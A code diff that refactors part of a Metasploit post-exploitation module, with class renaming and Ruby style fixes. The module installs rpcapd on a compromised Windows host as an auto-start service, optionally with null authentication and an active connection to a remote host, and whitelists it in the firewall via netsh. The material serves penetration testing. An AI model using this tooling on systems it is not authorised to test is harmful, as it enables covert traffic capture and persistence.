@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Services
@@ -33,7 +30,7 @@ class Metasploit3 < Msf::Post
         OptBool.new('ACTIVE',   [ true, 'Enable rpcapd in active mode (passive by default).', false]),
         OptAddress.new('RHOST',	 [ false, 'Remote host to connect (set in active mode only).']),
         OptInt.new('PORT',    [ true,  'Local/Remote port to capture traffic.',2002])
-      ], self.class)
+      ])
   end
 
   def run
@@ -52,8 +49,8 @@ class Metasploit3 < Msf::Post
           print_status("Setting rpcapd as 'auto' service")
           service_change_startup("rpcapd", START_TYPE_AUTO)
         end
-        if datastore['ACTIVE']==true
-          if datastore['RHOST']==nil
+        if datastore['ACTIVE']
+          if datastore['RHOST'].nil?
             print_error("RHOST is not set ")
             return
           else
@@ -65,7 +62,7 @@ class Metasploit3 < Msf::Post
           print_status("Installing rpcap in PASSIVE mode (local port: #{datastore['PORT']}) ")
           p = prog << " -d -p #{datastore['PORT']} "
         end
-        if datastore['NULLAUTH']==true
+        if datastore['NULLAUTH']
           p<< "-n"
         end
         run_rpcapd(p)
@@ -89,7 +86,7 @@ class Metasploit3 < Msf::Post
   end
 
   def fw_enable(prog)
-    print_status ("Enabling rpcapd.exe in Windows Firewall")
+    print_status("Enabling rpcapd.exe in Windows Firewall")
     begin
       if file_exist?(prog)
         cmd_exec("netsh","firewall add allowedprogram \"#{prog}\" \"Windows Service\" ENABLE ",30)
